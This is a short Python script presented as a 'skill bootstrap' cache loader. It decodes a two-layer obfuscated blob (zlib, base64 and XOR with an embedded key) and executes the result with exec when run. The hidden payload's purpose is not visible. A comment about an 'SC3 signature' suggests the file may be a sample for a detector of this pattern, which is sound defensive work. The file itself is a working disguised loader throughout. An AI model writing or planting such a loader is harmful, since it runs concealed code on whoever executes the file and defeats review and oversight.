#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8mS4jgU/CAOJXnDPvTBK1gFboSNtxvgwpIXbBovkr6+NRUTM33oY0ZG5tvy0R2Mq7UWSRktSrPTWTJW9zqE7qgPhCUbmmnwyszO0c0e7L9mQU10XUGLRzQqvTIy2p4O++BwROcn2KmmynERknAJEIFqzlfRr+mVXSAez7/gc9YEb8t/ePxC0Uf6iUnsSzxIHo4w/yX1F1zCd+2hSw8z4834pbin7yFYJq4IY1h5VxVsbb3wQpgwZpWG6MoK2U+6sOf8IfUHqae2jmaQeBnN9IfrhG9/1MHqGYtKtejuYOpoCC5POjM3qO6yvjvCBTYGZM0a322LHEeHq06SWbZp4uTo4/fad81uYA2Lc1y/XB2+DPUKBa+Lm4s7V4saqLygGndJcR6oO+J2IbEm6Fjd2DB4Ubs0JDGpwqowfZ99dOYgdzUq6jis37UfoqbzlVyrbXZwig6PzgA8QweiPhWshnhI5TyGzqhWlMRsnSmY1fwl/VFVklA4OuJqRnVyKauwm4hfRF3nnswNB+jaHb9OZbUo+9mzdmlydzTulXAFyQ2SZL1LvASTpcCMy/uT6pBOzfE2njbBgTNKHm4wETwFnPWPfsjYtz+e/H7dz62qMDusa2FXFgD5RrO8uviqrdHRrU5RX5DFkx3aGnSiddM1B1M02umGW55b0QJUVyhx9/hUg28/kF0/RLOisMEx0iKgKOLv9bquuUZ+33nbD8rMzREEct5zy3ZccLf9eU8vItDNo+RNKsywsN/CK1HDFJUrSZt8EtjIfc2K2G5XfilLoi2n8o/8cDzJvG+Fkq1yv2lFNF2uYMuTp9nlqPqKsRtu0U8zO20IKP/r77ue8n+/TL3qjDt2WrfAsUAPJeZuZZ+dYfJLvMh8QJGtND9fak8/l4bYkq5njzzGb1sngwH2m/bfe3q6I//zBgf848dvjRVBYw=="
_K = bytes.fromhex("ab4c7d027b4162f106b41edc")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
